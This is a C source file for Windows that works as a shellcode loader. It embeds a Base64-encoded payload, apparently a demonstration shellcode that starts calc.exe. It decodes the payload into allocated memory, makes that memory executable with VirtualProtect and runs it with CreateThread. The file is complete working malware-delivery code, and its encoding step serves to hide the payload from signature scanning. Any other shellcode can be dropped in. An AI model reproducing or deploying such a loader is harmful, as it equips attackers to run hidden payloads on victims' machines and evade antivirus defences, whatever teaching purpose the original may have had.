#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib") 

// payload in encoded format 
unsigned char payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA"; 
unsigned int payload_sz = sizeof(payload); 

int decode(const BYTE *src, unsigned int src_sz, char *dst, unsigned int dst_sz)
{
	DWORD out_sz; 
	out_sz = dst_sz; 
	
	// a pointer to string, sz, flag, ...
	BOOL rv = CryptStringToBinary((LPCSTR)src, src_sz, CRYPT_STRING_BASE64, (BYTE *)dst, &out_sz, NULL, NULL); 

	if (!rv) 
		out_sz = 0;       // failed 

	return out_sz; 
}

int main(void)
{
	void *exec_mem; 
	
	// allocate memory for payload 
	exec_mem = VirtualAlloc(0, payload_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
	
	// decode the payload 
	decode((const BYTE *)payload, payload_sz, (char *)exec_mem, payload_sz); 
	
	// make memory executable 
	DWORD old = 0; 
	BOOL rv = VirtualProtect(exec_mem, payload_sz, PAGE_EXECUTE_READ, &old); 
	
	if (rv != 0) {
		HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0); 
		WaitForSingleObject(th, -1); 
	}
	
	return 0; 
}
